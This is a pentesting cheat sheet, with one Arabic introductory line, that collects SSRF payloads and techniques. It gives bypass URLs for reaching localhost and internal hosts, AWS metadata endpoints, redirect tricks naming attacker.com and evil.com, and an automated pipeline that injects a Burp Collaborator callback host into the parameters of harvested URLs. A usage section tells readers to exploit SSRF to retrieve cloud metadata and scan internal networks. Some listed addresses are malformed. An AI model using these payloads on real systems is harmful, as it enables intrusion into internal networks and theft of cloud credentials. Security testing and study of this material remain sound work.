إليك تنظيم النقاط بشكل نصي عادي ومنظم:

---

### **SSRF (Server-Side Request Forgery) Payloads & Techniques**

#### **1. SSRF Payloads to Bypass Firewall**
1. **Bypass SSRF with CIDR**:
   ```bash
   http://127.127.127.127
   ```
2. **Bypass using Rare Address**:
   ```bash
   http://127.1
   ```
3. **Bypass using Tricks Combination**:
   ```bash
   http://1.1.1.802.2.2.2#03.3.3.3/
   urllib:3.3.3.3
   ```
4. **Bypass against a Weak Parser**:
   ```bash
   http://127.1.1.180@127.2.2.2:80/
   ```
5. **Bypass Localhost with `[::]`**:
   ```bash
   http://[::]:80/
   http://0000::1:80/
   ```

#### **2. What SSRF Allows**
- **Access Services on Loopback Interface**:
  ```bash
  Access services running on the loopback interface.
  ```
- **Scan Internal Network**:
  ```bash
  Scan and interact with internal network services.
  ```
- **Read Local Files**:
  ```bash
  Use `file://` protocol handler to read local files.
  ```
- **Lateral Movement**:
  ```bash
  Move laterally within the internal environment.
  ```

#### **3. Finding SSRF**
- **External Resource Access**:
  ```bash
  Test if the application allows loading external resources (e.g., profile images).
  ```
- **Port Scanning**:
  ```bash
  Use Burp Suite Intruder to scan ports by manipulating URLs.
  ```
- **Internal IP Scanning**:
  ```bash
  Scan private IP ranges like 192.168.x.x to discover alive hosts.

#### **4. AWS Metadata Retrieval**
- **AWS Metadata Endpoints**:
  ```bash
  http://169.254.169.254/computeMetadata/v1
  http://169.254.169.254/latest/meta-data
  ```

#### **5. URL Manipulation**
- **Burp Collaborator**:
  ```bash
  If the response has a link parameter, try sending it with your Burp Collaborator.
  ```
- **Open Redirect**:
  ```bash
  https://www.hahwul.com/phoenix/ssrf-open-redirect/
  ```

#### **6. Advanced SSRF Techniques**
- **Host Header Manipulation**:
  ```bash
  curl ip -H 'HOST: localhost'
  ```
- **Subdomain Manipulation**:
  ```bash
  target.com.(aydomain has IP 127.0.0.1)
  ```
- **Special Characters**:
  ```bash
  trarget.\com/%09/myburpcollab
  trarget.\com//myburpcollab
  trarget.\com\\myburpcollab
  target.\com/%0d/myburpcollab
  redirect_uri=target.\com&redirect_uri=attacker\.com
  redirect_uri=target.\com%40myburpcollab.\com
  ```
- **URL Parser Logic**:
  ```bash
  http://evil§google.com
  http://127.1:80@127.2.2.280/
  http://127.1:80@@127.2.2.280/
  0://evil.com:80http://google.com:80/
  ```
- **Unicode Normalization**:
  ```bash
  http://gооgle.com
  http://gⓞⓞgle.cⓞm
  ```
- **Address Encoding**:
  ```bash
  http://0177.0.0.1           # Octal Representation
  http://2130706433/          # Decimal Representation
  http://0x7f.0x0.0x0.0x1/    # Hex Representation
  http://0177.0x0.0x0.0x1/    # Mixed Representation
  ```
- **Localhost Representation**:
  ```bash
  http://0/
  http://127.1/
  http://0.0.0.0/
  http://127.127.127.127/
  ```

#### **7. IPv4 & IPv6 Variations**
- **IPv4 Standard Format**:
  ```bash
  http://127.0.0.1/
  ```
- **IPv4 Shortened Formats**:
  ```bash
  http://127.1/
  http://127.0.1/
  ```
- **IPv4 Decimal Representation**:
  ```bash
  http://2130706433/
  ```
- **IPv6 Representations**:
  ```bash
  http://[::1]/               # Standard IPv6 localhost
  http://[::ffff:127.0.0.1]/  # Mixed IPv6/IPv4
  ```
- **Localhost Name Variants**:
  ```bash
  http://localhost/
  http://localhost.localdomain/
  http://127.in-addr.arpa/
  ```
- **Empty Host**:
  ```bash
  http:///
  http://0/
  ```
- **Loopback Address Variants**:
  ```bash
  http://127.0.0.254/
  http://10.0.0.1/            # مثال لاختبار خاص بشبكات داخلية
  ```
- **Unicode and Punycode Normalization**:
  ```bash
  http://locaⅼhost/          # "l" مكتوب بـ Unicode مختلف
  http://lоcalhost/          # "o" مكتوب بشكل مختلف
  ```
- **Port Variations**:
  ```bash
  http://127.0.0.1:80/
  http://127.0.0.1:443/
  http://localhost:8080/
  http://localhost:3000/
  ```

#### **8. Blind SSRF Chains**
- **GitHub Resource**:
  ```bash
  https://github.com/assetnote/blind-ssrf-chains
  ```

#### **9. Automation Tools**
- **Findomain & Gau**:
  ```bash
  findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace your.burpcollaborator.net
  ```

---

### **How to Use This Information**
1. **Payload Testing**:
   - Use the provided payloads to test for SSRF vulnerabilities.
2. **Internal Network Scanning**:
   - Scan internal networks and services using SSRF.
3. **AWS Metadata Retrieval**:
   - Exploit SSRF to retrieve AWS metadata.
4. **URL Manipulation**:
   - Manipulate URLs to bypass filters and access restricted resources.
5. **Automation**:
   - Use tools like Findomain and Gau to automate SSRF discovery.

---

### **To fuzz for inoternal Ports**
- https://github.com/a7madn1/Fuzzing

---

- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet#id=8abff2b134596d1a84408e32730f1cc9c37cf68b
- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
- https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
- https://github.com/akincibor/SSRFexploit
- https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b
- https://github.com/cujanovic/SSRF-Testing/blob/master/cloud-metadata.txt
- https://github.com/MightyPirates/OpenComputers/security/advisories/GHSA-vvfj-xh7c-j2cm
- https://github.com/cujanovic/SSRF-Testing
- https://gist.github.com/BuffaloWill/fa96693af67e3a3dd3fb
- https://hackerone.com/reports/341876?fbclid=IwY2xjawIXImtleHRuA2FlbQIxMAABHZdHszMnAa3hciTXI-ynqJWl5puxQZm9XMfLwge48ljY0qwpFdtAZuC34Q_aem_lpCrr2aXbYPt2WgE-R0u9A
- https://www.hackerone.com/blog/how-server-side-request-forgery-ssrf

